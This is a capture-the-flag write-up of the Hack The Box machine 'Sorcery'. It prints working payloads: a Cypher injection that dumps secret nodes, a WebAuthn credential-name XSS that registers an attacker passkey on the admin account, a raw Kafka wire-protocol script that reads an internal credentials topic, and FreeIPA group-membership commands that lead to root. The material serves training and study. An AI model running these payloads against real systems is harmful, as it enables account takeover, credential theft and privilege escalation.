---
layout: default
title: "Sorcery"
parent: Insane Machines
grand_parent: Machines
permalink: /machines/insane/sorcery/
---

# Sorcery

![Machine Badge](https://img.shields.io/badge/Machine-Sorcery-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red)

| Property | Value |
|----------|-------|
| **OS** | Linux |
| **Difficulty** | Insane |
| **Release** | 2026-04-25 |
| **Tags** | #cypher-injection #neo4j #webauthn #passkey #kafka #freeipa |

---

## Summary

Sorcery is a four-stage Insane chain across modern application layers:

1. **Cypher Injection** in a Neo4j-backed graph application
2. **XSS in Passkey (WebAuthn) Registration** to attach an attacker-controlled authenticator to a privileged account
3. **Kafka Wire Protocol** exploitation for inter-service pivot
4. **FreeIPA** misconfiguration / privilege escalation for root

Each layer is independently rare; chained together they make Sorcery one of the most realistic enterprise-targeting Insane boxes HTB has shipped.

---

## External Writeups

- [0xdf - HTB Sorcery](https://0xdf.gitlab.io/2026/04/25/htb-sorcery.html)
- [Lazyhackers - Sorcery (Season 8)](https://lazyhackers.in/posts/sorcery-htb-writeup-hackthebox-season-8)

---

## Key Techniques

- **Cypher injection** in Neo4j (`MATCH (u {name: '$input'})` -> escape with `'})RETURN u UNION MATCH ...`)
- Neo4j `LOAD CSV FROM` for arbitrary HTTP fetch / SSRF
- **WebAuthn registration XSS** - inject script into the credential-name field, executed in admin context when the admin reviews registered passkeys
- Stealing the WebAuthn registration ceremony to register an attacker authenticator on the admin account
- **Kafka wire protocol** crafting (`ApiVersions`, `Produce`, `Fetch`) to bypass HTTP gateways
- Kafka consumer abuse to read internal service messages
- **FreeIPA** privilege escalation - HBAC misconfig, sudo rules referencing IPA groups, `ipa-getkeytab` extraction

---

## Attack Path

### 1. Cypher Injection

App lookup endpoint:

```
GET /api/wizard?name=Merlin
```

Translates server-side to:

```cypher
MATCH (w:Wizard {name: 'Merlin'}) RETURN w
```

Inject with closing quote + UNION:

```
?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

Dump the secrets node, revealing registration tokens and user enumeration.

### 2. WebAuthn Passkey Registration XSS

Admin reviews registered passkeys at `/admin/passkeys`. The `credential.name` field is rendered without sanitisation. Register a credential with name:

```html
<img src=x onerror="
fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
.then(r=>r.json()).then(c=>{
  // c contains the challenge - forge an attacker authenticator response
  navigator.credentials.create({publicKey:{...c, user:{id:Uint8Array.from('admin'.split('').map(c=>c.charCodeAt(0))), name:'admin', displayName:'admin'}}})
  .then(cred=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(cred)}))
})">
```

When the admin loads the page, their browser registers an attacker-controlled authenticator on the admin account. Log in as admin with the attacker passkey.

### 3. Kafka Wire Protocol Pivot

Admin dashboard exposes a Kafka management UI. Direct Kafka broker (port 9092) is firewalled - but a thin HTTP proxy forwards bytes if the **first byte matches the Kafka ApiVersions request opcode**. Craft raw bytes:

```python
import socket, struct
def kafka_req(api_key, api_version, correlation_id, client_id, payload=b''):
    body = struct.pack('>hhi', api_key, api_version, correlation_id)
    body += struct.pack('>h', len(client_id)) + client_id.encode()
    body += payload
    return struct.pack('>i', len(body)) + body

# ApiVersions (api_key=18)
s = socket.create_connection(('sorcery.htb', 8081))
s.send(kafka_req(18, 0, 1, 'pwn'))
print(s.recv(4096))
```

Enumerate topics, fetch messages from `internal-creds` topic, recover service-account credentials.

### 4. FreeIPA Privesc

Recovered service creds let you `kinit` into IPA:

```bash
kinit svc-app@SORCERY.HTB
ipa user-find
ipa hbacrule-show
sudo -l   # rule references 'sysadmin' IPA group
# Add yourself if WriteMember on the group:
ipa group-add-member sysadmin --users=svc-app
# Re-kinit and exploit sudo rule for root
```

---

## Lessons Learned

- **Cypher injection** is the Neo4j sibling of SQLi - identical mental model, almost no defensive tooling.
- **WebAuthn / passkeys** add a new XSS sink: the credential **name field**. The phishable step is registration, not authentication.
- **Kafka over a "thin" gateway** is one of the highest-impact lateral primitives in cloud-native stacks - raw wire-protocol fluency is becoming required for red teams.
- **FreeIPA** is the Linux AD - same exploitable design patterns (HBAC rules, sudo references to group names, service keytab extraction).
- An Insane box combines obscure layers; the technique inventory is the bottleneck, not exploitation skill.

---

## References

- Cypher injection cheatsheet: https://book.hacktricks.xyz/pentesting-web/sql-injection/nosql-injection#cypher-injection
- WebAuthn spec credential-management abuse
- Kafka wire protocol: https://kafka.apache.org/protocol.html
- FreeIPA red-team primer: https://github.com/0xJs/FreeIPA-Pentesting-Cheatsheet
